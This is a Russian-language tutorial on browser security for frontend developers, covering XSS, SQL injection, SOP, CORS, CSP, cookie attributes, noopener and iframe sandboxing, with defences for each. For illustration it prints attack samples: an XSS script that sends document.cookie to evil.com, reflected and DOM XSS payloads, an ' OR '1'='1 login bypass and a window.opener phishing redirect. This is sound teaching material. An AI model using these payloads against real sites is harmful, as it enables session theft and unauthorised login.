# Безопасность в браузере

Браузер — это среда, в которой код со всего интернета исполняется на машине пользователя. Это делает безопасность критически важной темой: злоумышленники постоянно ищут способы украсть данные, захватить аккаунты или встроить вредоносный код. Фронтенд-разработчик должен понимать основные угрозы и механизмы защиты.

---

## XSS (Cross-Site Scripting)

XSS — это атака, при которой злоумышленник внедряет вредоносный JavaScript-код на страницу, которую видят другие пользователи. Этот код исполняется в контексте уязвимого сайта и получает доступ к его данным: cookies, localStorage, DOM.

### Типы XSS

**Stored XSS (хранимый)** — вредоносный код сохраняется в базе данных. Пользователь пишет в комментарий:

```html
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

Если сайт выводит комментарии без экранирования, этот скрипт выполнится у каждого, кто откроет страницу. Наиболее опасный тип — затрагивает всех пользователей.

**Reflected XSS (отражённый)** — вредоносный код передаётся через URL и немедленно отражается в ответе:

```
https://example.com/search?q=<script>alert(document.cookie)</script>
```

Если сервер вставляет значение `q` в HTML без экранирования — скрипт выполняется. Жертву заставляют перейти по такой ссылке (фишинг).

**DOM-based XSS** — уязвимость только на клиентской стороне. Браузер читает данные из URL (например, через `location.hash`) и вставляет их в DOM без санитизации:

```javascript
// Уязвимый код
document.getElementById('output').innerHTML = location.hash.slice(1);
```

Злоумышленник присылает ссылку: `https://example.com/page#<img src=x onerror=alert(1)>`

### Как предотвратить

1. **Экранирование вывода** — всегда преобразуйте специальные символы перед вставкой в HTML (`<` → `&lt;`, `>` → `&gt;` и т.д.). Это делает большинство шаблонизаторов по умолчанию.

2. **Используйте `textContent`, а не `innerHTML`**:

```javascript
// Опасно
element.innerHTML = userInput;

// Безопасно
element.textContent = userInput;
```

3. **Санитизация HTML** — если нужно позволить пользователям вводить HTML (например, в редакторе), используйте библиотеки вроде DOMPurify:

```javascript
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

4. **Content Security Policy** — ограничивает источники скриптов (подробнее ниже).

5. **HttpOnly cookies** — не позволяет JavaScript читать cookies с токенами аутентификации.

---

## SQL-инъекции

SQL-инъекция — атака на базу данных, при которой злоумышленник вставляет SQL-код в пользовательский ввод. Например, в поле логина:

```
' OR '1'='1
```

Если сервер формирует запрос строкой: `SELECT * FROM users WHERE login = '` + userInput + `'`, получается:

```sql
SELECT * FROM users WHERE login = '' OR '1'='1'
```

Это выражение всегда истинно — и злоумышленник входит без пароля.

**Почему фронтенд-разработчик должен это знать?** Потому что первый рубеж защиты — валидация на клиенте. Она не заменяет серверную валидацию, но снижает риск. Понимание принципа атаки помогает не доверять пользовательскому вводу и не строить запросы конкатенацией строк. На бэкенде используются параметризованные запросы — защита от SQL-инъекций, но фронтенд-разработчик должен понимать природу проблемы.

---

## SOP — Same-Origin Policy

Same-Origin Policy — фундаментальный механизм безопасности браузера, который изолирует документы из разных источников друг от друга.

### Что такое origin

**Origin = схема + хост + порт**. Два URL имеют одинаковый origin только если все три компонента совпадают:

| URL | Отношение к `http://example.com` | Причина |
|-----|----------------------------------|---------|
| `http://example.com/about` | Тот же origin | Только путь отличается |
| `https://example.com` | Разный origin | Другая схема (https vs http) |
| `http://example.com:8080` | Разный origin | Другой порт |
| `http://api.example.com` | Разный origin | Другой хост |

### Что SOP запрещает

JavaScript из `http://site-a.com` не может:
- Читать содержимое страницы, открытой в другом окне с `http://site-b.com`
- Читать ответ `fetch`-запроса к `http://site-b.com` (без CORS)
- Читать `localStorage` или `IndexedDB` другого origin
- Читать cookies другого origin через `document.cookie`

### Что SOP разрешает

Встраивание внешних ресурсов разрешено — именно поэтому CDN работают:

```html
<script src="https://cdn.jsdelivr.net/..."></script>
<link rel="stylesheet" href="https://fonts.googleapis.com/...">
<img src="https://images.example.com/photo.jpg">
<iframe src="https://player.vimeo.com/..."></iframe>
```

Но JavaScript не может прочитать содержимое этих ресурсов (например, распарсить скрипт или прочитать DOM iframe с другого origin).

---

## CORS — Cross-Origin Resource Sharing

CORS — это механизм, который позволяет серверу явно разрешить запросы с других origins. Без CORS fetch-запрос к другому домену будет заблокирован браузером.

### Зачем нужен

Типичный сценарий: фронтенд на `https://app.example.com` делает запрос к API на `https://api.example.com`. Это разные origins — SOP блокирует ответ. Сервер API должен сказать браузеру «я разрешаю запросы с этого домена».

### Простые запросы

Некоторые запросы считаются «простыми» и не требуют предварительной проверки. Условия:
- Метод: GET, HEAD или POST
- Заголовки только стандартные: `Accept`, `Content-Type` (только `text/plain`, `application/x-www-form-urlencoded`, `multipart/form-data`)

Браузер добавляет заголовок `Origin`, сервер отвечает с `Access-Control-Allow-Origin`:

```http
# Запрос браузера
GET /api/data HTTP/1.1
Origin: https://app.example.com

# Ответ сервера
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
```

### Preflight запрос

Для нестандартных методов (PUT, DELETE, PATCH) или нестандартных заголовков (например, `Authorization`, `Content-Type: application/json`) браузер сначала отправляет **preflight** — предварительный запрос методом OPTIONS.

```http
# Preflight (автоматически браузером)
OPTIONS /api/users/42 HTTP/1.1
Origin: https://app.example.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: Authorization

# Ответ сервера (разрешить)
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Max-Age: 86400
```

Только после успешного preflight браузер отправляет основной запрос. `Access-Control-Max-Age` кэширует результат preflight на указанное время.

### Ключевые заголовки CORS

| Заголовок | Назначение |
|-----------|-----------|
| `Access-Control-Allow-Origin` | Разрешённый origin (`*` или конкретный домен) |
| `Access-Control-Allow-Methods` | Разрешённые HTTP-методы |
| `Access-Control-Allow-Headers` | Разрешённые заголовки запроса |
| `Access-Control-Max-Age` | Время кэширования preflight (секунды) |
| `Access-Control-Allow-Credentials` | `true` — разрешить отправку cookies |
| `Access-Control-Expose-Headers` | Какие заголовки ответа доступны JavaScript |

Важно: если запрос отправляется с `credentials: 'include'`, сервер обязан вернуть конкретный origin в `Access-Control-Allow-Origin` — использовать `*` нельзя.

---

## JSONP

JSONP (JSON with Padding) — старый трюк для обхода SOP до появления CORS. Суть: браузер не блокирует загрузку скриптов с других доменов, поэтому сервер возвращал данные как вызов функции:

```html
<script src="https://api.other.com/data?callback=myFunction"></script>
```

Сервер возвращал:
```javascript
myFunction({"users": [...]})
```

**Почему устарел:**
- Работает только с GET-запросами
- Серьёзная уязвимость: если API взломан или злоумышленник подменяет ответ — исполняется произвольный JavaScript
- CORS полностью решил ту же задачу безопасным способом

Сегодня JSONP не используют в новых проектах.

---

## CSP — Content Security Policy

CSP — это политика безопасности, которую сервер передаёт через HTTP-заголовок. Она говорит браузеру, откуда разрешено загружать ресурсы. Основная цель — защита от XSS.

### Заголовок

```http
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com; img-src *
```

### Основные директивы

| Директива | Назначение |
|-----------|-----------|
| `default-src` | Политика по умолчанию для всех ресурсов |
| `script-src` | Откуда можно загружать JavaScript |
| `style-src` | Откуда можно загружать CSS |
| `img-src` | Откуда можно загружать изображения |
| `connect-src` | Куда можно делать fetch/XHR/WebSocket запросы |
| `frame-ancestors` | Кто может встраивать страницу в iframe |

### Значения источников

| Значение | Смысл |
|----------|-------|
| `'self'` | Только тот же origin |
| `'none'` | Никто |
| `'unsafe-inline'` | Разрешить inline-скрипты (ослабляет защиту) |
| `'unsafe-eval'` | Разрешить `eval()` (ослабляет защиту) |
| `https:` | Любой HTTPS-источник |
| `https://cdn.example.com` | Конкретный домен |

### Пример строгой политики

```http
Content-Security-Policy: default-src 'self'; script-src 'nonce-abc123'; object-src 'none'
```

```html
<!-- Только скрипт с нужным nonce будет выполнен -->
<script nonce="abc123">console.log('разрешён');</script>
<script>alert('заблокирован');</script>
```

Для тестирования политики без блокировки используют `Content-Security-Policy-Report-Only` — нарушения только логируются.

---

## Аутентификация vs авторизация

Часто путают, но это разные вещи:

- **Аутентификация (Authentication)** — «Кто ты?» Проверка личности: логин/пароль, токен, биометрия. Результат: браузер знает, что вы — это вы.
- **Авторизация (Authorization)** — «Что тебе можно?» Проверка прав доступа после аутентификации. Результат: система знает, какие действия вы можете выполнять.

Пример: вы вошли в систему (аутентификация), но не можете удалять чужие статьи (авторизация). HTTP-коды отражают это различие: `401 Unauthorized` = не аутентифицирован, `403 Forbidden` = аутентифицирован, но нет прав.

---

## Защита cookies

Cookie — основной способ хранить сессионные данные. Несколько атрибутов делают их безопаснее:

### Secure

Отправляет cookie только по HTTPS. По HTTP — не передаётся, даже если запрос идёт на тот же сервер. Защищает от перехвата при атаке Man-in-the-Middle.

```http
Set-Cookie: session=abc123; Secure
```

### HttpOnly

Запрещает доступ к cookie из JavaScript (`document.cookie` вернёт пустую строку). Cookie передаётся только в HTTP-заголовках. Ключевая защита от кражи токена через XSS.

```http
Set-Cookie: session=abc123; HttpOnly
```

### SameSite

Контролирует отправку cookie при кросс-сайтовых запросах. Защита от CSRF-атак.

| Значение | Поведение |
|----------|-----------|
| `Strict` | Cookie только при запросах с того же сайта |
| `Lax` | Cookie при навигации (ссылки), но не при POST с других сайтов. Значение по умолчанию в современных браузерах |
| `None` | Cookie при любых запросах, включая кросс-сайтовые. Требует `Secure` |

```http
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

### Domain и Path

`Domain` — какой домен (и поддомены) получает cookie. `Path` — для каких путей cookie отправляется. Path не является мерой безопасности — его легко обойти, если злоумышленник уже получил доступ к странице.

### Expires / Max-Age

Определяют срок жизни. Cookie без этих атрибутов — сессионная, удаляется при закрытии браузера. `Max-Age` имеет приоритет над `Expires`.

```http
Set-Cookie: prefs=dark; Max-Age=2592000; Path=/; SameSite=Lax
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
```

---

## rel="noopener noreferrer"

При открытии ссылки с `target="_blank"` новая вкладка получает доступ к окну-источнику через `window.opener`. Это создаёт уязвимость: открытая страница может перенаправить исходную на фишинговый сайт.

```javascript
// Вредоносная страница может сделать:
window.opener.location = 'https://phishing-site.com';
```

### Решение

```html
<a href="https://external-site.com" target="_blank" rel="noopener noreferrer">
  Внешняя ссылка
</a>
```

| Атрибут | Эффект |
|---------|--------|
| `noopener` | `window.opener` будет `null` — открытая страница не может управлять исходной |
| `noreferrer` | `window.opener = null` + не передаёт заголовок `Referer` (конфиденциальность) |

Современные браузеры автоматически применяют поведение `noopener` для `target="_blank"`, но явное указание атрибута — хорошая практика для совместимости и ясности намерений.

---

## iframe sandbox

Атрибут `sandbox` у `<iframe>` ограничивает возможности встроенного контента. По умолчанию `sandbox` запрещает всё, а потом можно явно разрешить конкретные возможности.

```html
<!-- Полный sandbox — встроенный контент ничего не может -->
<iframe src="https://untrusted-content.com" sandbox></iframe>

<!-- Разрешаем только формы и скрипты -->
<iframe src="widget.html" sandbox="allow-forms allow-scripts"></iframe>
```

### Значения sandbox

| Значение | Что разрешает |
|----------|--------------|
| `allow-scripts` | Выполнение JavaScript |
| `allow-forms` | Отправку форм |
| `allow-same-origin` | Доступ к родительскому origin (осторожно!) |
| `allow-popups` | Открытие новых окон |
| `allow-top-navigation` | Навигацию родительского окна |
| `allow-downloads` | Скачивание файлов |

Если добавить `allow-scripts` и `allow-same-origin` одновременно, iframe может снять sandbox через JavaScript — это лишает защиту смысла.

Типичный безопасный вариант для виджетов сторонних сервисов (реклама, интерактивный контент):

```html
<iframe 
  src="https://third-party-widget.com" 
  sandbox="allow-scripts allow-forms"
  title="Описание виджета">
</iframe>
```

---

## Источники

- [MDN: Same-Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
- [MDN: CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [MDN: HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [MDN: rel=noopener](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/noopener)
